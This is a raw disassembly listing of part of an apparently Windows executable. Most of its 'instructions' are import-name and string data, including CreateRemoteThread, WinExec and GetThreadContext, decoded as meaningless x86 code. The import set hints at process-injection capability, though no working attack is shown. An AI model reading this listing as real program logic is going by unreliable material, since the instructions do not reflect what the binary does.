  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	(bad)  
  413ba9:	ss inc ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	je     0x413bf7
  413bf6:	inc    ebx
  413bf7:	add    BYTE PTR [ecx+0x49],bl
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    dl,ch
  413c45:	adc    DWORD PTR [ebx+0x0],eax
  413c48:	add    BYTE PTR [eax],al
  413c4a:	add    BYTE PTR [eax],al
  413c4c:	inc    esp
  413c4d:	add    BYTE PTR [esi+0x0],al
  413c50:	imul   eax,DWORD PTR [eax],0x4a006f
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
